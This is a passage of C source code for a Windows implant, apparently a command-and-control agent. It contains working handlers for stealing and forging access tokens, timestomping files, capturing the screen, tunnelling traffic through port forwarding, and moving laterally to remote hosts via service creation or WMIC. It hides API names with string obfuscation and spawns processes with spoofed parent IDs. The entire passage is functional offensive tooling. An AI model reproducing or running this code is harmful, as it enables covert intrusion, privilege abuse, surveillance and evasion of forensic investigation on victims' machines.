        typedef LONG (WINAPI *pfnRegDeleteValueA_t)(HKEY, LPCSTR);
        typedef LONG (WINAPI *pfnRegCloseKey_t)(HKEY);

        HMODULE adv = g_LoadLibraryA(OBFSTR("advapi32.dll"));
        if (!adv) { result = ErrorResult(cmd, "advapi32 unavailable"); goto rdone; }

        pfnRegOpenKeyExA_t   pOpen  = (pfnRegOpenKeyExA_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegOpenKeyExA"));
        pfnRegDeleteValueA_t pDel   = (pfnRegDeleteValueA_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegDeleteValueA"));
        pfnRegCloseKey_t     pClose = (pfnRegCloseKey_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegCloseKey"));

        if (!pOpen || !pDel || !pClose) { result = ErrorResult(cmd, "reg API unavailable"); goto rdone; }

        HKEY hKey = NULL;
        LONG rc = pOpen((HKEY)0x80000001,
                        OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                        0, 0x0002, &hKey);
        if (rc != 0 || !hKey) { result = ErrorResult(cmd, "RegOpenKeyEx failed"); goto rdone; }

        rc = pDel(hKey, name);
        pClose(hKey);
        result = (rc == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("reg persist removed"))
                           : ErrorResult(cmd, "RegDeleteValue failed");

    } else if (strcmp(method, "schtask") == 0) {
        char taskCmd[PATH_MAX_C + 64];
        xsnprintf(taskCmd, sizeof(taskCmd),
                  "cmd.exe /C schtasks /Delete /F /TN \"%s\"", name);

        HANDLE hProc = NULL, hThr = NULL;
        BOOL ok = _CreateProcessWithPPID(taskCmd, &hProc, &hThr, NULL, NULL);
        if (ok) {
            WaitForSingleObject(hProc, 10000);
            DWORD ec = 1;
            GetExitCodeProcess(hProc, &ec);
            CloseHandle(hThr);
            CloseHandle(hProc);
            result = (ec == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("schtask removed"))
                               : ErrorResult(cmd, "schtasks delete returned error");
        } else {
            result = ErrorResult(cmd, "CreateProcess failed");
        }

    } else {
        result = ErrorResult(cmd, "unknown method (use reg or schtask)");
    }

rdone:
    ImplantFree(method);
    ImplantFree(name);
    return result;
}

/* ── token ───────────────────────────────────────────────────────────────────
 *
 * Token impersonation via advapi32 (dynamically resolved).
 *
 * Args:
 *   { "action": "steal",      "pid": N }
 *   { "action": "revert" }
 *   { "action": "make_token", "user": "user", "pass": "pass",
 *                              "domain": "." }  (domain optional, defaults ".")
 */
static AgentResult *CmdToken(const AgentCommand *cmd) {
    char *action = JsonGetStr(cmd->args_json, "action");
    if (!action || !action[0]) {
        ImplantFree(action);
        return ErrorResult(cmd, "missing action (steal|revert|make_token)");
    }

    HMODULE adv = g_LoadLibraryA(OBFSTR("advapi32.dll"));
    if (!adv) { ImplantFree(action); return ErrorResult(cmd, "advapi32 unavailable"); }

    /* ── revert ─────────────────────────────────────────────────────────── */
    if (strcmp(action, "revert") == 0) {
        ImplantFree(action);
        typedef BOOL (WINAPI *pfnRevert_t)(void);
        pfnRevert_t pRevert = (pfnRevert_t)
            (FARPROC)g_GetProcAddress(adv, OBFSTR("RevertToSelf"));
        if (!pRevert || !pRevert())
            return ErrorResult(cmd, "RevertToSelf failed");
        return MakeResult(cmd, 1, 0, ImplantStrDup("reverted to self"));

    /* ── steal ──────────────────────────────────────────────────────────── */
    } else if (strcmp(action, "steal") == 0) {
        ImplantFree(action);
        char *pidStr = JsonGetStr(cmd->args_json, "pid");
        if (!pidStr) return ErrorResult(cmd, "missing pid");
        DWORD pid = 0;
        for (const char *p = pidStr; *p >= '0' && *p <= '9'; p++)
            pid = pid * 10 + (*p - '0');
        ImplantFree(pidStr);

        typedef BOOL (WINAPI *pfnOpenProcTok_t)(HANDLE, DWORD, PHANDLE);
        typedef BOOL (WINAPI *pfnDupTokEx_t)(HANDLE, DWORD, PVOID, DWORD, DWORD, PHANDLE);
        typedef BOOL (WINAPI *pfnImpersonate_t)(HANDLE);

        pfnOpenProcTok_t pOPT = (pfnOpenProcTok_t)
            (FARPROC)g_GetProcAddress(adv, OBFSTR("OpenProcessToken"));
        pfnDupTokEx_t    pDup = (pfnDupTokEx_t)
            (FARPROC)g_GetProcAddress(adv, OBFSTR("DuplicateTokenEx"));
        pfnImpersonate_t pImp = (pfnImpersonate_t)
            (FARPROC)g_GetProcAddress(adv, OBFSTR("ImpersonateLoggedOnUser"));

        if (!pOPT || !pDup || !pImp)
            return ErrorResult(cmd, "token API unavailable");

        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProc) return ErrorResult(cmd, "OpenProcess failed");

        HANDLE hTok = NULL;
        /* TOKEN_DUPLICATE | TOKEN_QUERY = 0x000A */
        if (!pOPT(hProc, 0x000A, &hTok)) {
            CloseHandle(hProc);
            return ErrorResult(cmd, "OpenProcessToken failed");
        }
        CloseHandle(hProc);

        HANDLE hImpTok = NULL;
        /* DuplicateTokenEx: TOKEN_ALL_ACCESS, SecurityImpersonation=2, TokenImpersonation=2 */
        BOOL ok = pDup(hTok, 0x000F01FF, NULL, 2, 2, &hImpTok);
        CloseHandle(hTok);
        if (!ok) return ErrorResult(cmd, "DuplicateTokenEx failed");

        ok = pImp(hImpTok);
        CloseHandle(hImpTok);
        if (!ok) return ErrorResult(cmd, "ImpersonateLoggedOnUser failed");

        char out[48];
        xsnprintf(out, sizeof(out), "impersonating pid %lu", (unsigned long)pid);
        return MakeResult(cmd, 1, 0, ImplantStrDup(out));

    /* ── make_token ─────────────────────────────────────────────────────── */
    } else if (strcmp(action, "make_token") == 0) {
        ImplantFree(action);
        char *user   = JsonGetStr(cmd->args_json, "user");
        char *pass   = JsonGetStr(cmd->args_json, "pass");
        char *domain = JsonGetStr(cmd->args_json, "domain");  /* optional */

        if (!user || !user[0] || !pass) {
            ImplantFree(user); ImplantFree(pass); ImplantFree(domain);
            return ErrorResult(cmd, "missing user or pass");
        }

        typedef BOOL (WINAPI *pfnLogonUserA_t)(LPCSTR, LPCSTR, LPCSTR, DWORD, DWORD, PHANDLE);
        typedef BOOL (WINAPI *pfnImpersonate_t)(HANDLE);

        pfnLogonUserA_t  pLogon = (pfnLogonUserA_t)
            (FARPROC)g_GetProcAddress(adv, OBFSTR("LogonUserA"));
        pfnImpersonate_t pImp   = (pfnImpersonate_t)
            (FARPROC)g_GetProcAddress(adv, OBFSTR("ImpersonateLoggedOnUser"));

        if (!pLogon || !pImp) {
            ImplantFree(user); ImplantFree(pass); ImplantFree(domain);
            return ErrorResult(cmd, "logon API unavailable");
        }

        const char *dom = (domain && domain[0]) ? domain : ".";
        HANDLE hTok = NULL;
        /* LOGON32_LOGON_NEW_CREDENTIALS=9, LOGON32_PROVIDER_DEFAULT=0 */
        BOOL ok = pLogon(user, dom, pass, 9, 0, &hTok);
        ImplantFree(user); ImplantFree(pass); ImplantFree(domain);
        if (!ok) return ErrorResult(cmd, "LogonUser failed");

        ok = pImp(hTok);
        CloseHandle(hTok);
        if (!ok) return ErrorResult(cmd, "ImpersonateLoggedOnUser failed");

        return MakeResult(cmd, 1, 0, ImplantStrDup("token created and impersonated"));

    } else {
        ImplantFree(action);
        return ErrorResult(cmd, "unknown action (steal|revert|make_token)");
    }
}

/* ── timestomp ───────────────────────────────────────────────────────────────
 *
 * Overwrite a file's creation, access, and write timestamps.
 *
 * Args (one of):
 *   { "path": "C:\\target.txt", "time": "2020-01-15T10:30:00Z" }
 *   { "path": "C:\\target.txt", "ref":  "C:\\Windows\\explorer.exe" }
 */
static BOOL _ParseISO8601(const char *s, SYSTEMTIME *st) {
    memset(st, 0, sizeof(*st));
    if (!s) return FALSE;
    int len = 0; while (s[len]) len++;
    if (len < 19) return FALSE;
    /* "YYYY-MM-DDTHH:MM:SS" */
    st->wYear   = (WORD)((s[0]-'0')*1000+(s[1]-'0')*100+(s[2]-'0')*10+(s[3]-'0'));
    st->wMonth  = (WORD)((s[5]-'0')*10+(s[6]-'0'));
    st->wDay    = (WORD)((s[8]-'0')*10+(s[9]-'0'));
    st->wHour   = (WORD)((s[11]-'0')*10+(s[12]-'0'));
    st->wMinute = (WORD)((s[14]-'0')*10+(s[15]-'0'));
    st->wSecond = (WORD)((s[17]-'0')*10+(s[18]-'0'));
    return (st->wYear > 1970 && st->wMonth >= 1 && st->wMonth <= 12 && st->wDay >= 1);
}

static AgentResult *CmdTimestomp(const AgentCommand *cmd) {
    char *path    = JsonGetStr(cmd->args_json, "path");
    char *timeStr = JsonGetStr(cmd->args_json, "time");
    char *refPath = JsonGetStr(cmd->args_json, "ref");

    if (!path || !path[0]) {
        ImplantFree(path); ImplantFree(timeStr); ImplantFree(refPath);
        return ErrorResult(cmd, "missing path");
    }
    if (!timeStr && !refPath) {
        ImplantFree(path); ImplantFree(timeStr); ImplantFree(refPath);
        return ErrorResult(cmd, "need time or ref");
    }

    FILETIME ftCreate = {0}, ftAccess = {0}, ftWrite = {0};
    BOOL gotTime = FALSE;

    if (refPath && refPath[0]) {
        /* Copy timestamps from reference file */
        WCHAR wRef[PATH_MAX_C] = {0};
        StrToWstr(refPath, wRef, PATH_MAX_C);
        HANDLE hRef = CreateFileW(wRef, GENERIC_READ,
                                   FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                                   NULL, OPEN_EXISTING,
                                   FILE_ATTRIBUTE_NORMAL|FILE_FLAG_BACKUP_SEMANTICS, NULL);
        if (hRef != INVALID_HANDLE_VALUE) {
            gotTime = GetFileTime(hRef, &ftCreate, &ftAccess, &ftWrite);
            CloseHandle(hRef);
        }
    } else {
        SYSTEMTIME st;
        if (_ParseISO8601(timeStr, &st)) {
            FILETIME ftLocal;
            if (SystemTimeToFileTime(&st, &ftLocal)) {
                ftCreate = ftAccess = ftWrite = ftLocal;
                gotTime = TRUE;
            }
        }
    }

    ImplantFree(timeStr);
    ImplantFree(refPath);

    if (!gotTime) {
        ImplantFree(path);
        return ErrorResult(cmd, "failed to resolve timestamp");
    }

    WCHAR wPath[PATH_MAX_C] = {0};
    StrToWstr(path, wPath, PATH_MAX_C);
    ImplantFree(path);

    /* FILE_WRITE_ATTRIBUTES + FILE_FLAG_BACKUP_SEMANTICS (needed for directories) */
    HANDLE hFile = CreateFileW(wPath, FILE_WRITE_ATTRIBUTES,
                                FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                                NULL, OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL|FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return ErrorResult(cmd, "CreateFile failed (check path and permissions)");

    BOOL ok = SetFileTime(hFile, &ftCreate, &ftAccess, &ftWrite);
    CloseHandle(hFile);

    return ok ? MakeResult(cmd, 1, 0, ImplantStrDup("timestamps updated"))
              : ErrorResult(cmd, "SetFileTime failed");
}

/* ── screenshot ──────────────────────────────────────────────────────────────
 *
 * Captures the primary display via GDI (user32+gdi32, dynamically resolved),
 * encodes the result as a standard 24-bit BMP file, and returns it base64.
 * No args required.  Output may be large on high-resolution displays.
 */
static AgentResult *CmdScreenshot(const AgentCommand *cmd) {
    typedef HDC     (WINAPI *pfnGetDC_t)(HWND);
    typedef int     (WINAPI *pfnReleaseDC_t)(HWND, HDC);
    typedef int     (WINAPI *pfnGetSM_t)(int);
    typedef HDC     (WINAPI *pfnCCD_t)(HDC);
    typedef HBITMAP (WINAPI *pfnCCB_t)(HDC, int, int);
    typedef BOOL    (WINAPI *pfnBitBlt_t)(HDC,int,int,int,int,HDC,int,int,DWORD);
    typedef int     (WINAPI *pfnGDB_t)(HDC,HBITMAP,UINT,UINT,LPVOID,LPBITMAPINFO,UINT);
    typedef BOOL    (WINAPI *pfnDelObj_t)(HGDIOBJ);
    typedef BOOL    (WINAPI *pfnDelDC_t)(HDC);
    typedef HGDIOBJ (WINAPI *pfnSelObj_t)(HDC, HGDIOBJ);

    HMODULE hU = g_GetModuleHandleA(OBFSTR("user32.dll"));
    if (!hU) hU = g_LoadLibraryA(OBFSTR("user32.dll"));
    HMODULE hG = g_GetModuleHandleA(OBFSTR("gdi32.dll"));
    if (!hG) hG = g_LoadLibraryA(OBFSTR("gdi32.dll"));
    if (!hU || !hG) return ErrorResult(cmd, "GDI unavailable");

    pfnGetDC_t     pGDC = (pfnGetDC_t)    (FARPROC)g_GetProcAddress(hU, OBFSTR("GetDC"));
    pfnReleaseDC_t pRDC = (pfnReleaseDC_t)(FARPROC)g_GetProcAddress(hU, OBFSTR("ReleaseDC"));
    pfnGetSM_t     pGSM = (pfnGetSM_t)    (FARPROC)g_GetProcAddress(hU, OBFSTR("GetSystemMetrics"));
    pfnCCD_t       pCCD = (pfnCCD_t)      (FARPROC)g_GetProcAddress(hG, OBFSTR("CreateCompatibleDC"));
    pfnCCB_t       pCCB = (pfnCCB_t)      (FARPROC)g_GetProcAddress(hG, OBFSTR("CreateCompatibleBitmap"));
    pfnBitBlt_t    pBlt = (pfnBitBlt_t)   (FARPROC)g_GetProcAddress(hG, OBFSTR("BitBlt"));
    pfnGDB_t       pGDB = (pfnGDB_t)      (FARPROC)g_GetProcAddress(hG, OBFSTR("GetDIBits"));
    pfnDelObj_t    pDO  = (pfnDelObj_t)   (FARPROC)g_GetProcAddress(hG, OBFSTR("DeleteObject"));
    pfnDelDC_t     pDD  = (pfnDelDC_t)    (FARPROC)g_GetProcAddress(hG, OBFSTR("DeleteDC"));
    pfnSelObj_t    pSO  = (pfnSelObj_t)   (FARPROC)g_GetProcAddress(hG, OBFSTR("SelectObject"));

    if (!pGDC||!pRDC||!pGSM||!pCCD||!pCCB||!pBlt||!pGDB||!pDO||!pDD||!pSO)
        return ErrorResult(cmd, "GDI functions unavailable");

    int cx = pGSM(0 /*SM_CXSCREEN*/);
    int cy = pGSM(1 /*SM_CYSCREEN*/);
    if (cx <= 0 || cy <= 0) return ErrorResult(cmd, "invalid screen dimensions");

    HDC     hdcScr = pGDC(NULL);
    HDC     hdcMem = pCCD(hdcScr);
    HBITMAP hBmp   = pCCB(hdcScr, cx, cy);
    pSO(hdcMem, hBmp);
    pBlt(hdcMem, 0, 0, cx, cy, hdcScr, 0, 0, 0x00CC0020 /*SRCCOPY*/);

    /* 24-bit BGR bottom-up (standard BMP row layout) */
    int   stride = ((cx * 3) + 3) & ~3;
    DWORD pixSz  = (DWORD)stride * (DWORD)cy;
    BYTE *pixels = (BYTE*)ImplantAlloc((SIZE_T)pixSz);
    if (!pixels) {
        pDO(hBmp); pDD(hdcMem); pRDC(NULL, hdcScr);
        return ErrorResult(cmd, "pixel alloc failed");
    }

    BITMAPINFO bi;
    memset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth       = cx;
    bi.bmiHeader.biHeight      = cy;    /* positive = bottom-up */
    bi.bmiHeader.biPlanes      = 1;
    bi.bmiHeader.biBitCount    = 24;
    bi.bmiHeader.biCompression = 0;    /* BI_RGB */

    int lines = pGDB(hdcScr, hBmp, 0, (UINT)cy, pixels, &bi, 0 /*DIB_RGB_COLORS*/);
    pDO(hBmp); pDD(hdcMem); pRDC(NULL, hdcScr);
    if (lines <= 0) { ImplantFree(pixels); return ErrorResult(cmd, "GetDIBits failed"); }

    /* Assemble BMP file: BITMAPFILEHEADER(14) + BITMAPINFOHEADER(40) + pixels */
    DWORD hdrSz  = 14 + sizeof(BITMAPINFOHEADER);
    DWORD fileSz = hdrSz + pixSz;
    BYTE *bmp    = (BYTE*)ImplantAlloc((SIZE_T)fileSz);
    if (!bmp) { ImplantFree(pixels); return ErrorResult(cmd, "BMP alloc failed"); }

    bmp[0] = 'B'; bmp[1] = 'M';
    *(DWORD*)(bmp+2)  = fileSz;
    *(WORD*)(bmp+6)   = 0; *(WORD*)(bmp+8) = 0;
    *(DWORD*)(bmp+10) = hdrSz;
    bi.bmiHeader.biSizeImage = pixSz;
    memcpy(bmp+14, &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
    memcpy(bmp+hdrSz, pixels, pixSz);
    ImplantFree(pixels);

    int   b64Cap = (int)(((fileSz + 2) / 3) * 4) + 4;
    char *b64    = (char*)ImplantAlloc((SIZE_T)b64Cap);
    if (!b64) { ImplantFree(bmp); return ErrorResult(cmd, "b64 alloc failed"); }
    int b64Len = Base64Encode(bmp, (int)fileSz, b64, b64Cap);
    ImplantFree(bmp);
    if (b64Len <= 0) { ImplantFree(b64); return ErrorResult(cmd, "Base64 failed"); }
    return MakeResult(cmd, 1, 0, b64);
}

/* ── Port-forward session table ───────────────────────────────────────────── *
 *
 * portfwd_open  { "id": "<uuid>", "host": "x.x.x.x", "port": N }
 * portfwd_send  { "id": "<uuid>", "data": "<b64>" }   → returns recvd b64
 * portfwd_close { "id": "<uuid>" }
 *
 * Sockets are maintained in s_pf[]; ws2_32.dll loaded on first use.
 * recv uses a 500 ms timeout so portfwd_send is non-blocking from the
 * operator's perspective.
 */
#define PF_MAX    8
#define PF_ID_LEN 37

typedef struct { char id[PF_ID_LEN]; UINT_PTR sock; } PFEntry;
static PFEntry s_pf[PF_MAX];
static int     s_pf_n   = 0;
static BOOL    s_wsa_ok = FALSE;
static HMODULE s_ws2    = NULL;

typedef int      (WINAPI *pfnWSAStartup_t)(WORD, void*);
typedef UINT_PTR (WINAPI *pfnSocket_t)(int, int, int);
typedef int      (WINAPI *pfnConnect_t)(UINT_PTR, const void*, int);
typedef int      (WINAPI *pfnSend_t)(UINT_PTR, const char*, int, int);
typedef int      (WINAPI *pfnRecv_t)(UINT_PTR, char*, int, int);
typedef int      (WINAPI *pfnClosesocket_t)(UINT_PTR);
typedef int      (WINAPI *pfnSetsockopt_t)(UINT_PTR, int, int, const void*, int);

static pfnWSAStartup_t  s_WSAStartup  = NULL;
static pfnSocket_t      s_Socket      = NULL;
static pfnConnect_t     s_Connect     = NULL;
static pfnSend_t        s_Send        = NULL;
static pfnRecv_t        s_Recv        = NULL;
static pfnClosesocket_t s_Closesocket = NULL;
static pfnSetsockopt_t  s_Setsockopt  = NULL;

static BOOL _EnsureWinsock(void) {
    if (s_wsa_ok) return TRUE;
    if (!s_ws2) s_ws2 = g_LoadLibraryA(OBFSTR("ws2_32.dll"));
    if (!s_ws2) return FALSE;
#define WR(n) s_##n = (pfn##n##_t)(FARPROC)g_GetProcAddress(s_ws2, OBFSTR(#n)); if (!s_##n) return FALSE;
    WR(WSAStartup) WR(socket) WR(connect) WR(send) WR(recv) WR(closesocket) WR(setsockopt)
#undef WR
    BYTE wsa[400] = {0};
    *(WORD*)wsa = 0x0202;
    if (s_WSAStartup(0x0202, wsa) != 0) return FALSE;
    s_wsa_ok = TRUE;
    return TRUE;
}

/* Build sin_addr from dotted-decimal (returns value in network byte order) */
static DWORD _inet4(const char *s) {
    BYTE b[4] = {0}; int i = 0, v = 0;
    for (const char *p = s; i < 4; p++) {
        if (*p >= '0' && *p <= '9') v = v * 10 + (*p - '0');
        else { b[i++] = (BYTE)v; v = 0; if (!*p) break; }
    }
    return *(DWORD*)b;
}
static WORD _hton16(WORD h) { return (WORD)((h >> 8) | ((h & 0xFF) << 8)); }

static AgentResult *CmdPortFwdOpen(const AgentCommand *cmd) {
    char *id    = JsonGetStr(cmd->args_json, "id");
    char *host  = JsonGetStr(cmd->args_json, "host");
    char *portS = JsonGetStr(cmd->args_json, "port");
    if (!id || !host || !portS) {
        ImplantFree(id); ImplantFree(host); ImplantFree(portS);
        return ErrorResult(cmd, "missing id/host/port");
    }
    WORD port = 0;
    for (const char *p = portS; *p >= '0' && *p <= '9'; p++) port = (WORD)(port * 10 + (*p - '0'));
    ImplantFree(portS);

    if (s_pf_n >= PF_MAX) { ImplantFree(id); ImplantFree(host); return ErrorResult(cmd, "session table full"); }
    if (!_EnsureWinsock()) { ImplantFree(id); ImplantFree(host); return ErrorResult(cmd, "winsock init failed"); }

    /* 2=AF_INET, 1=SOCK_STREAM, 6=IPPROTO_TCP */
    UINT_PTR s = s_Socket(2, 1, 6);
    if (s == ~(UINT_PTR)0) { ImplantFree(id); ImplantFree(host); return ErrorResult(cmd, "socket() failed"); }

    /* sockaddr_in: sin_family(2) + sin_port(2) + sin_addr(4) + zero(8) = 16 bytes */
    BYTE sa[16] = {0};
    *(WORD*)(sa+0) = 2;                  /* AF_INET */
    *(WORD*)(sa+2) = _hton16(port);
    *(DWORD*)(sa+4) = _inet4(host);
    ImplantFree(host);

    if (s_Connect(s, sa, 16) != 0) {
        s_Closesocket(s); ImplantFree(id);
        return ErrorResult(cmd, "connect() failed");
    }

    /* 500 ms recv timeout — 0xFFFF=SOL_SOCKET, 0x1006=SO_RCVTIMEO */
    DWORD to = 500;
    s_Setsockopt(s, 0xFFFF, 0x1006, &to, sizeof(to));

    xsnprintf(s_pf[s_pf_n].id, PF_ID_LEN, "%s", id);
    s_pf[s_pf_n].sock = s;
    s_pf_n++;
    ImplantFree(id);
    return MakeResult(cmd, 1, 0, ImplantStrDup("connected"));
}

static AgentResult *CmdPortFwdSend(const AgentCommand *cmd) {
    char *id   = JsonGetStr(cmd->args_json, "id");
    char *data = JsonGetStr(cmd->args_json, "data");
    if (!id) { ImplantFree(id); ImplantFree(data); return ErrorResult(cmd, "missing id"); }

    PFEntry *e = NULL;
    for (int i = 0; i < s_pf_n; i++) if (strcmp(s_pf[i].id, id) == 0) { e = &s_pf[i]; break; }
    ImplantFree(id);
    if (!e) { ImplantFree(data); return ErrorResult(cmd, "unknown session"); }

    /* Send base64-decoded data if provided */
    if (data && data[0]) {
        int dLen = (int)strlen(data);
        BYTE *raw = (BYTE*)ImplantAlloc((SIZE_T)(dLen + 1));
        if (raw) {
            int rawLen = Base64Decode(data, dLen, raw, dLen);
            if (rawLen > 0) s_Send(e->sock, (const char*)raw, rawLen, 0);
            ImplantFree(raw);
        }
    }
    ImplantFree(data);

    /* Read available response (up to 64 KB; 500 ms timeout already set on socket) */
    DWORD cap = 65536, total = 0;
    BYTE *buf = (BYTE*)ImplantAlloc((SIZE_T)(cap + 1));
    if (!buf) return ErrorResult(cmd, "alloc failed");
    int n;
    while (total < cap && (n = s_Recv(e->sock, (char*)buf + total, (int)(cap - total), 0)) > 0)
        total += (DWORD)n;

    if (total == 0) { ImplantFree(buf); return MakeResult(cmd, 1, 0, ImplantStrDup("")); }

    int b64Cap = (int)(((total + 2) / 3) * 4) + 4;
    char *b64 = (char*)ImplantAlloc((SIZE_T)b64Cap);
    if (!b64) { ImplantFree(buf); return ErrorResult(cmd, "b64 alloc failed"); }
    Base64Encode(buf, (int)total, b64, b64Cap);
    ImplantFree(buf);
    return MakeResult(cmd, 1, 0, b64);
}

static AgentResult *CmdPortFwdClose(const AgentCommand *cmd) {
    char *id = JsonGetStr(cmd->args_json, "id");
    if (!id) return ErrorResult(cmd, "missing id");
    for (int i = 0; i < s_pf_n; i++) {
        if (strcmp(s_pf[i].id, id) == 0) {
            s_Closesocket(s_pf[i].sock);
            s_pf[i] = s_pf[--s_pf_n];
            memset(&s_pf[s_pf_n], 0, sizeof(s_pf[0]));
            ImplantFree(id);
            return MakeResult(cmd, 1, 0, ImplantStrDup("closed"));
        }
    }
    ImplantFree(id);
    return ErrorResult(cmd, "session not found");
}

/* ── lateral ──────────────────────────────────────────────────────────────────
 *
 * Execute a command on a remote host.
 *
 * Methods:
 *   "scm" — connect to remote Service Control Manager via SMB (port 445),
 *            create a one-shot service, start it, then delete it.
 *            Requires local admin on target and IPC$/Admin$ accessible.
 *   "wmi" — shell out to wmic.exe; lower privilege requirement but noisier.
 *
 * Args: { "host": "x.x.x.x", "cmd": "C:\\Windows\\...", "method": "scm"|"wmi",
 *          "svc_name": "<optional; default WinTelemetry>" }
 */
#ifndef SC_MANAGER_CREATE_SERVICE
#define SC_MANAGER_CREATE_SERVICE 0x0002
#define SERVICE_WIN32_OWN_PROCESS 0x0010
#define SERVICE_DEMAND_START      0x0003
#define SERVICE_ERROR_IGNORE      0x0000
#define SERVICE_ALL_ACCESS        0xF01FF
#endif

static AgentResult *CmdLateral(const AgentCommand *cmd) {
    char *host   = JsonGetStr(cmd->args_json, "host");
    char *lcmd   = JsonGetStr(cmd->args_json, "cmd");
    char *method = JsonGetStr(cmd->args_json, "method");
    char *svcNm  = JsonGetStr(cmd->args_json, "svc_name");

    if (!host || !host[0] || !lcmd || !lcmd[0] || !method || !method[0]) {
        ImplantFree(host); ImplantFree(lcmd); ImplantFree(method); ImplantFree(svcNm);
        return ErrorResult(cmd, "missing host, cmd, or method");
    }

    AgentResult *result = NULL;

    /* ── WMI via wmic.exe ───────────────────────────────────────────────── */
    if (strcmp(method, "wmi") == 0) {
        char shellCmd[PATH_MAX_C * 2];
        xsnprintf(shellCmd, sizeof(shellCmd),
                  "cmd.exe /C wmic /node:\"%s\" process call create \"%s\"",
                  host, lcmd);
        HANDLE hProc = NULL, hThr = NULL;
        BOOL ok = _CreateProcessWithPPID(shellCmd, &hProc, &hThr, NULL, NULL);
        if (ok) {
            WaitForSingleObject(hProc, 30000);
            DWORD ec = 1; GetExitCodeProcess(hProc, &ec);
            CloseHandle(hThr); CloseHandle(hProc);
            result = (ec == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("wmi exec sent"))
                               : ErrorResult(cmd, "wmic returned non-zero exit");
        } else {
            result = ErrorResult(cmd, "CreateProcess(wmic) failed");
        }
        goto lat_done;
    }

    /* ── SCM service-creation lateral (PsExec-style) ─────────────────────
     *
     * Creates a SERVICE_WIN32_OWN_PROCESS service whose BinaryPathName is the
     * command to run.  The service binary does not need to be a real service
     * host — it will be started, run the command, and exit (or fail to start
     * after the command executes, which is acceptable).
     */
    if (strcmp(method, "scm") == 0) {
        typedef SC_HANDLE (WINAPI *pfnOSCM_t)(LPCSTR, LPCSTR, DWORD);
        typedef SC_HANDLE (WINAPI *pfnCSvc_t)(SC_HANDLE, LPCSTR, LPCSTR, DWORD,
                           DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD,
                           LPCSTR, LPCSTR, LPCSTR);
        typedef BOOL      (WINAPI *pfnSSvc_t)(SC_HANDLE, DWORD, LPCSTR*);
        typedef SC_HANDLE (WINAPI *pfnOSvc_t)(SC_HANDLE, LPCSTR, DWORD);
        typedef BOOL      (WINAPI *pfnDSvc_t)(SC_HANDLE);
        typedef BOOL      (WINAPI *pfnCSCH_t)(SC_HANDLE);

        HMODULE adv = g_LoadLibraryA(OBFSTR("advapi32.dll"));
        if (!adv) { result = ErrorResult(cmd, "advapi32 unavailable"); goto lat_done; }

        pfnOSCM_t pOSCM = (pfnOSCM_t)(FARPROC)g_GetProcAddress(adv, OBFSTR("OpenSCManagerA"));
        pfnCSvc_t pCSvc = (pfnCSvc_t)(FARPROC)g_GetProcAddress(adv, OBFSTR("CreateServiceA"));
        pfnSSvc_t pSSvc = (pfnSSvc_t)(FARPROC)g_GetProcAddress(adv, OBFSTR("StartServiceA"));
        pfnOSvc_t pOSvc = (pfnOSvc_t)(FARPROC)g_GetProcAddress(adv, OBFSTR("OpenServiceA"));
        pfnDSvc_t pDSvc = (pfnDSvc_t)(FARPROC)g_GetProcAddress(adv, OBFSTR("DeleteService"));
        pfnCSCH_t pCSCH = (pfnCSCH_t)(FARPROC)g_GetProcAddress(adv, OBFSTR("CloseServiceHandle"));

        if (!pOSCM||!pCSvc||!pSSvc||!pOSvc||!pDSvc||!pCSCH) {
            result = ErrorResult(cmd, "SCM API unavailable"); goto lat_done;
        }

        const char *svnm = (svcNm && svcNm[0]) ? svcNm : OBFSTR("WinTelemetry");

        SC_HANDLE hMgr = pOSCM(host, NULL, SC_MANAGER_CREATE_SERVICE);
        if (!hMgr) { result = ErrorResult(cmd, "OpenSCManager failed (SMB/credentials?)"); goto lat_done; }

        SC_HANDLE hSvc = pCSvc(hMgr, svnm, svnm,
                               SERVICE_ALL_ACCESS,
                               SERVICE_WIN32_OWN_PROCESS,
                               SERVICE_DEMAND_START,
                               SERVICE_ERROR_IGNORE,
                               lcmd, NULL, NULL, NULL, NULL, NULL);
        if (!hSvc) {
            /* Service name may already exist — open and reuse */
            hSvc = pOSvc(hMgr, svnm, SERVICE_ALL_ACCESS);
        }
        if (!hSvc) {
            pCSCH(hMgr);
            result = ErrorResult(cmd, "CreateService/OpenService failed"); goto lat_done;
        }

        BOOL started = pSSvc(hSvc, 0, NULL);

        /* Wait briefly so the process has time to launch before cleanup */
        Sleep(1500);
        pDSvc(hSvc);
        pCSCH(hSvc);
        pCSCH(hMgr);

        result = started ? MakeResult(cmd, 1, 0, ImplantStrDup("service started on remote host"))
                         : ErrorResult(cmd, "StartService failed (service created, cleaned up)");
        goto lat_done;
    }

    result = ErrorResult(cmd, "unknown method (scm|wmi)");

lat_done:
    ImplantFree(host); ImplantFree(lcmd); ImplantFree(method); ImplantFree(svcNm);
    return result;
}

/* ── Dispatcher ──────────────────────────────────────────────────────────── */

AgentResult *ExecuteCommand(const AgentCommand *cmd) {
    if (!cmd || !cmd->type[0]) return NULL;

    if (strcmp(cmd->type, "shell")          == 0) return CmdShell(cmd);
    if (strcmp(cmd->type, "ps")             == 0) return CmdPS(cmd);
    if (strcmp(cmd->type, "cd")             == 0) return CmdCD(cmd);
    if (strcmp(cmd->type, "sleep")          == 0) return CmdSleep(cmd);
    if (strcmp(cmd->type, "kill")           == 0) return CmdKill(cmd);
    if (strcmp(cmd->type, "ppid")           == 0) return CmdPPID(cmd);
    if (strcmp(cmd->type, "getpid")         == 0) return CmdGetPID(cmd);
    if (strcmp(cmd->type, "whoami")         == 0) return CmdWhoami(cmd);
    if (strcmp(cmd->type, "inject")         == 0) return CmdInject(cmd);
